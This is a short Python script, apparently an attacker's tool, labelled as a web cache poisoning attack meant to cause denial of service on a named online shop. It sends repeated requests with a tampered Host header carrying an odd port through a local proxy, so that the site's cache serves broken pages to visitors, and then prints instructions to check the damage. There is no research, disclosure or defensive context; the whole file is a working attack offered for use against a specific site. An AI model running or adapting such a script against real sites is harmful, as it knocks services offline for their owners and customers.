#site : https://onlineshop.aa.com.mm
#attack type : web cache poisoning to DOS

import requests
from urllib3.exceptions import InsecureRequestWarning
#we dont need threading in this attack

class attack():
    def __init__(self):
        

        requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
        self.url="https://onlineshop.aa.com.mm/pom?page=11"
        self.header={"Host":"onlineshop.aa.com.mm:2323","User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0"}
        
        

    def start(self):
        proxies={'http':'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'}
        for i in range(5):
            print("attacking....")
            self.r=requests.get(self.url,proxies=proxies,headers=self.header,verify=False)
        print(f'attack complete check out the url  {self.url} and click the another pages')
        

        
        
if __name__=='__main__':
    a=attack()
    a.start()
